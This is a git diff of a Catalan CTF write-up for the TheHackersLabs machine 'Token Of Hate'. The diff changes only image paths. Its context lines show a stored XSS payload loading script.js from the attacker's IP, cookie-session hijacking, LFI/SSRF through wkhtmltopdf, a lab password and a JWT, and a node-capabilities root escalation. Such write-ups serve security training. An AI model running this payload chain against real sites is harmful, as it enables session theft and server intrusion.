@@ -5,7 +5,7 @@ title: WriteUp Token Of Hate - TheHackersLabs
 slug: token-of-hate-writeup-thehackerslabs-ca
 featured: false
 draft: false
-ogImage: "assets/token-of-hate/OpenGraph.png"
+ogImage: "../../../assets/images/token-of-hate/OpenGraph.png"
 tags:
   - writeup
   - thehackerslabs
@@ -20,7 +20,7 @@ description:
   Resolució d’un CTF de TheHackersLabs, amb enumeració, explotació d’XSS emmagatzemat via Unicode, segrest de cookies, atacs LFI i SSRF, manipulació de JWT per a RCE i escalada de privilegis amb capabilities en Linux.
 lang: ca
 ---
-![Rabbit Token Of Hate](/assets/token-of-hate/OpenGraph.png)
+![Rabbit Token Of Hate](../../../assets/images/token-of-hate/OpenGraph.png)
 
 Resolució d’un CTF de TheHackersLabs, amb enumeració, explotació d’XSS emmagatzemat via Unicode, segrest de cookies, atacs LFI i SSRF, manipulació de JWT per a RCE i escalada de privilegis amb capabilities en Linux.
 
@@ -28,7 +28,7 @@ Resolució d’un CTF de TheHackersLabs, amb enumeració, explotació d’XSS em
 
 ## Enumeració
 
-![alt text](/assets/token-of-hate/image.png)
+![alt text](../../../assets/images/token-of-hate/image.png)
 
 Fem un ping i observem pel TTL 64 que és una màquina amb sistema operatiu `Linux`.
 
@@ -171,7 +171,7 @@ Finished
 
 Obrim el lloc web del port 80 al navegador.
 
-![alt text](/assets/token-of-hate/image-1.png)
+![alt text](../../../assets/images/token-of-hate/image-1.png)
 
 Ens trobem amb un lloc web; si hi parem atenció, ens aporta diverses pistes sobre com podria anar la intrusió.
 
@@ -180,7 +180,7 @@ Ens trobem amb un lloc web; si hi parem atenció, ens aporta diverses pistes sob
 
 A més, hi trobem dos enllaços: un a un formulari de registre `Ir a Registro`.
 
-![alt text](/assets/token-of-hate/image-2.png)
+![alt text](../../../assets/images/token-of-hate/image-2.png)
 
 Amb el codi font següent.
 
@@ -229,7 +229,7 @@ Amb el codi font següent.
 
 I un altre enllaç que mostra el formulari de login `Ir a Login`.
 
-![alt text](/assets/token-of-hate/image-3.png)
+![alt text](../../../assets/images/token-of-hate/image-3.png)
 
 Amb el següent codi font.
 
@@ -275,7 +275,7 @@ Amb el següent codi font.
 
 Ens registrem amb qualsevol usuari i contrasenya i iniciem sessió amb el mateix usuari. Ens trobem amb una pàgina privada.
 
-![alt text](/assets/token-of-hate/image-4.png)
+![alt text](../../../assets/images/token-of-hate/image-4.png)
 
 Si mirem el codi font d’aquesta pàgina, hi trobarem alguna pista més als comentaris.
 
@@ -312,7 +312,7 @@ Si mirem el codi font d’aquesta pàgina, hi trobarem alguna pista més als com
 
 Observem que la cookie del navegador, creada amb la nostra sessió iniciada, no té activades les flags `HttpOnly`, `Secure` ni `SameSite`.
 
-![alt text](/assets/token-of-hate/image-5.png)
+![alt text](../../../assets/images/token-of-hate/image-5.png)
 
 ## Intrusió
 
@@ -377,7 +377,7 @@ $ ./tranformar.sh '<script src="http://192.168.1.181/script.js"></script>'
 ＜script src=“http://192.168.1.181/script.js“＞＜/script＞
 ```
 
-![alt text](/assets/token-of-hate/image-6.png)
+![alt text](../../../assets/images/token-of-hate/image-6.png)
 
 D’altra banda, creem un servei web amb python al port 80 i ens posem a escoltar. En poc temps rebem una petició.
 
@@ -420,11 +420,11 @@ PHPSESSID=sd3q3eeg0v7cl3phim5r21iqah
 
 Iniciem sessió al navegador amb el primer usuari de prova que vam crear (si cal, en creem un altre des del formulari de registre). Un cop hem iniciat sessió, des de les eines de desenvolupador del navegador, a la pestanya `Storage > Cookies`, modifiquem el valor de la cookie de sessió `PHPSESSID` pel rebut al nostre servei web i després actualitzem la pàgina.
 
-![alt text](/assets/token-of-hate/image-7.png)
+![alt text](../../../assets/images/token-of-hate/image-7.png)
 
 Obtenim accés com a usuari amb rol d’administrador a l’aplicació web; ara podem veure tots els usuaris registrats, eliminar-los i descarregar un document PDF amb tots els usuaris.
 
-![alt text](/assets/token-of-hate/image-8.png)
+![alt text](../../../assets/images/token-of-hate/image-8.png)
 
 ### Inclusió de fitxer local (LFI)
 
@@ -436,7 +436,7 @@ En generar el document PDF, veiem que rebem peticions al nostre servei web però
 
 Descarreguem el PDF generat amb el llistat d’usuaris i l’analitzem.
 
-![alt text](/assets/token-of-hate/image-9.png)
+![alt text](../../../assets/images/token-of-hate/image-9.png)
 
 Observem amb `exiftool` que està generat amb `wkhtmltopdf 0.12.6`, una eina molt popular per transformar `HTML` en `PDF`.
 
@@ -453,11 +453,11 @@ x.send();
 
 Descarreguem el document PDF i obtenim el fitxer `/etc/passwd`.
 
-![alt text](/assets/token-of-hate/image-10.png)
+![alt text](../../../assets/images/token-of-hate/image-10.png)
 
 Podem continuar llegint diversos fitxers del servidor, però trobem unes credencials filtrades al fitxer `/var/www/html/index.php`.
 
-![alt text](/assets/token-of-hate/image-11.png)
+![alt text](../../../assets/images/token-of-hate/image-11.png)
 
 Les apuntem per recordar-les.
 
@@ -516,7 +516,7 @@ x.send();
 
 Descarreguem el PDF i obtenim un text en format JSON.
 
-![alt text](/assets/token-of-hate/image-12.png)
+![alt text](../../../assets/images/token-of-hate/image-12.png)
 
 ```json
 {
@@ -596,7 +596,7 @@ users.forEach(async user => {
 
 Esperem una estona i, de seguida, rebem totes les peticions al nostre servei web. Si ens hi fixem, les dades més extenses són les de l’usuari `Jose`, amb la primera lletra en majúscula i sense accent.
 
-![alt text](/assets/token-of-hate/image-13.png)
+![alt text](../../../assets/images/token-of-hate/image-13.png)
 
 Descodifiquem el base64 de la resposta de la petició de login per a l’usuari `Jose`.
 
@@ -619,7 +619,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoidXNlciI
 
 Per descodificar-lo, utilitzem el lloc web http://jwt.io.
 
-![alt text](/assets/token-of-hate/image-14.png)
+![alt text](../../../assets/images/token-of-hate/image-14.png)
 
 Observem que el token utilitza l’algoritme `HS256` (paràmetre `alg` de l’HEADER) i que el temps de validesa després del login és d’una hora. Això s’obté dels paràmetres `exp` (emès en format UNIX timestamp) i `iat` (expira en format UNIX timestamp) del PAYLOAD.
 
@@ -707,7 +707,7 @@ petition1.send('{"username":"Jose","password":"FuLqqEAErWQsmTQQQhsb"}');
 
 Tornem a descarregar un altre fitxer PDF i obtenim execució de comandes amb l’usuari `ctesias`.
 
-![alt text](/assets/token-of-hate/image-15.png)
+![alt text](../../../assets/images/token-of-hate/image-15.png)
 
 Modifiquem la primera variable `command` del nostre javascript al fitxer `script.js`, introduint la IP de la nostra màquina atacant.
 
@@ -728,7 +728,7 @@ ctesias@tokenofhate:/$
 
 Aconseguim entrar a la màquina víctima com a usuari `ctesias`.
 
-![alt text](/assets/token-of-hate/image-16.png)
+![alt text](../../../assets/images/token-of-hate/image-16.png)
 
 Podem llegir la flag de user.txt.
 
@@ -765,7 +765,7 @@ v18.19.0
 
 Cerquem a `gtfobins` una manera d’escalar amb el binari `node` i capabilites, i la trobem.
 
-![alt text](/assets/token-of-hate/image-17.png)
+![alt text](../../../assets/images/token-of-hate/image-17.png)
 
 Executem la següent comanda per aconseguir privilegis de root.
 
